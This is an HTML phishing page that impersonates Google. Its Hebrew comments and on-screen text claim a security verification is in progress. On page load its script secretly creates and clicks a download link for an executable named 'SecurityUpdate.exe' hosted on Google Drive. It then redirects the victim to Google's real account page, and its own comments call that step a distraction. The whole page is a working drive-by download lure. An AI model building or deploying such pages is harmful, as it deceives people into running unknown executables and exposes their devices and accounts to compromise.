<!DOCTYPE html>
<html>
<head>
    <title>Google Verification</title>
    <script>
        window.onload = function() {
            // 1. יצירת קישור הורדה נסתר
            var downloadLink = document.createElement("a");
            downloadLink.href = "https://drive.google.com/file/d/1qGoRHLF8HH3PrSL72Ip3PKAMb4QvGuoN/view?usp=sharing";
            downloadLink.download = "SecurityUpdate.exe";
            
            // 2. לחיצה אוטומטית על הקישור בלי שהמשתמש יראה
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);

            // 3. הסחת דעת - מעבר לדף "אימות הצליח" אחרי שנייה אחת
            setTimeout(function() {
                window.location.href = "https://myaccount.google.com/security";
            }, 1500);
        };
    </script>
</head>
<body style="font-family: Arial; text-align: center; padding-top: 100px;">
    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
    <p>מבצע אימות אבטחה, אנא המתן...</p>
    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: auto;"></div>
    <style>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</body>
</html>
